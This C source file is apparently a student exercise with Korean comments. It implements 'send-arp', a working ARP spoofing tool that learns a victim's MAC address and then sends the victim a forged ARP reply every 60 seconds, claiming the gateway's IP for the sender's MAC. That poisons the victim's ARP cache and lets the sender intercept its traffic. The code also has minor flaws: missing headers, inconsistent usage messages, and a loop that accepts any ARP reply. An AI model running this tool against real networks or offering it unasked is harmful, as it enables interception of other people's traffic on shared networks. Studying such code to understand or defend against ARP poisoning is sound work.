#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <pcap.h>


#pragma pack(push, 1)
typedef struct{
    eth_hdr eth;
    arp_hdr arp;
}etharpkt;
#pragma pack(pop)

void usage(){
    printf("syntax: send-arp <interface>\n");
    printf("sample: send-arp wlan0\n");
}

int search_my_ip(char* interface, uint32_t* my_ip){
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return 1;
    }

    // IP 주소를 uint32_t로 변환하여 저장
    *my_ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;

    close(sock);
    return 0;
}

int search_my_mac(char* interface, uint8_t* my_mac){
    struct ifreq ifr;
    /*ifreq는 
    struct ifreq {
    char ifr_name[IFNAMSIZ]; /* 인터페이스 이름 (예: "eth0", "wlan0") 
        union {
            struct sockaddr ifr_addr;      IP 주소 
            struct sockaddr ifr_dstaddr;   P-P 목적지 주소 
            struct sockaddr ifr_broadaddr; 브로드캐스트 주소
            struct sockaddr ifr_netmask;   서브넷 마스크 
            struct sockaddr ifr_hwaddr;    하드웨어(MAC) 주소 
            short           ifr_flags;     상태 플래그 (UP/DOWN 등) 
            int             ifr_ifindex;   인터페이스 인덱스 
            int             ifr_metric;    메트릭 값 
            int             ifr_mtu;       MTU 크기 
            기타 다양한 데이터 필드 
        } ifr_ifru;
    };*/
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    // #define AF_INET 2 ipv4 기반의 주소체계를 쓰겠다는 뜻이다.
    // #define SOCK_DGRAM 2 udp를 사용하겠다는 뜻이다.
    // ipproto_ip는 ipv4를 기반으로 기본 전송 프로토콜을 쓰겠다는 뜻이다.
    // 소켓 번호가 저장이 된다.
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    //ifr.ifr_name은 복사를 받을 문자열의 주소, interface는 복사를 할 문자열의 주소이다. ifnamsiz - 1은 복사 받을 문자열의 길이이다. 
    //여기서 ifnamsiz는 16으로 네트워크 인터페이스 이름이 가질 수 있는 최대 길이를 의미한다.
    ifr.ifr_name[IFNAMSIZ - 1] = '\0'; //strncpy는 문자열의 끝을 표시 안해주기 때문에 문자열의 끝을 만들어준다.

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        //ioctl함수에서 sock은 대상이 되는 파일 디스크립터이다. 네트워크 정보를 다룰 때는 
        //socket 함수로 생성한 소켓 번호가 들어간다. siocgifhwaddr은 mac가져오라는 장치에 내리는 명령어이다.
        perror("ioctl");
        close(sock);
        return 1;
    }

    // MAC 주소 복사 (6바이트)
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);

    close(sock);
    return 0;
}

// arp 패킷 요청에 대한 대답을 받을 때까지 무한 반복하는 함수이다.
int get_arp_packet(pcap_t* pcap, etharpkt* t_packet){
    struct pcap_pkthdr* header;
    const u_char* packet;
    etharpkt* pkt;
    int res;

    while(1){
        res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0) continue;  // 타임아웃 발생 시 계속 대기
        if(res == -1 || res == -2){
            perror("pcap_next_ex");
            return -1;
        }

        pkt = (etharpkt*)packet; //시작점을 pkt에 저장
        
        // ARP 패킷인지 확인 
        if(ntohs(pkt->eth.eth_type) != 0x0806) continue;
        
        // ARP 연산이 Reply인지 확인 reply는 2이고 request는 1이다.
        if(ntohs(pkt->arp.opcode) != 2) continue;
        
        // 여기서는 ARP Reply 패킷이면 모두Accept
        memcpy(t_packet, pkt, sizeof(etharpkt)); // t_packet에다가 옮겨주고 반환해준다.
        
        return 0;  // 패킷을 찾았으면 반환
    }
}



int main(int argc, char* argv[]){
    //argv 1은 wlan0 즉, 무선 랜카드이다.
    if(argc < 2){
        usage();
        return 1;
    }
    else if(argc < 3){
        printf("syntax: send-arp <victim ip>\n");
        return 1;
    }
    else if(argc < 4){
        printf("syntax: send-arp <gateway ip>\n");
        return 1;
    }

    char* interface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(pcap == NULL){
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
        return 1;
    }

    uint8_t my_mac[6];
    uint32_t my_ip;
    
    if(search_my_mac(interface, my_mac) != 0 || search_my_ip(interface, &my_ip) != 0){
        fprintf(stderr,"error : can't find my mac or ip\n");
        return 1;
    }
    // --- 1단계: 희생자의 MAC 주소를 알아오기 위한 Request 패킷 준비 ---
    etharpkt request_pkt; // 포인터가 아닌 일반 변수로 선언

    // Ethernet Header
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    memcpy(request_pkt.eth.dmac, broadcast_mac, 6);
    memcpy(request_pkt.eth.smac, my_mac, 6);
    request_pkt.eth.eth_type = htons(0x0806);

    // ARP Header (Request)
    request_pkt.arp.htype = htons(0x0001);
    request_pkt.arp.ptype = htons(0x0800);
    request_pkt.arp.hsize = 6;
    request_pkt.arp.psize = 4;
    request_pkt.arp.opcode = htons(1);
    memcpy(request_pkt.arp.smac, my_mac, 6);
    request_pkt.arp.sip = my_ip; 

    uint8_t unknown_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    memcpy(request_pkt.arp.tmac, unknown_mac, 6);
    request_pkt.arp.tip = inet_addr(argv[2]); // 희생자 IP

    // Request 전송
    if (pcap_sendpacket(pcap, (const u_char *)&request_pkt, sizeof(etharpkt)) != 0) {
        fprintf(stderr, "Error: Failed to send request packet\n");
        exit(EXIT_FAILURE);
    }

    // 응답 대기 및 희생자 MAC 추출
    etharpkt arp_response;
    get_arp_packet(pcap, &arp_response);

    uint8_t vmac[6];
    memcpy(vmac, arp_response.arp.smac, 6);

    etharpkt attack_pkt; 

    memcpy(attack_pkt.eth.dmac, vmac, 6);
    memcpy(attack_pkt.eth.smac, my_mac, 6);
    attack_pkt.eth.eth_type = htons(0x0806);
    attack_pkt.arp.htype = htons(0x0001);
    attack_pkt.arp.ptype = htons(0x0800);
    attack_pkt.arp.hsize = 6;
    attack_pkt.arp.psize = 4;
    attack_pkt.arp.opcode = htons(2); //reply로 속이는 것이다.
    memcpy(attack_pkt.arp.smac, my_mac, 6); 
    attack_pkt.arp.sip = inet_addr(argv[3]); 

    memcpy(attack_pkt.arp.tmac, vmac, 6);
    attack_pkt.arp.tip = inet_addr(argv[2]);

    while (true) {
        if (pcap_sendpacket(pcap, (const u_char *)&attack_pkt, sizeof(etharpkt)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
            break;
        }
        sleep(60); 
    }

    

    
    pcap_close(pcap);

    return 0;
}

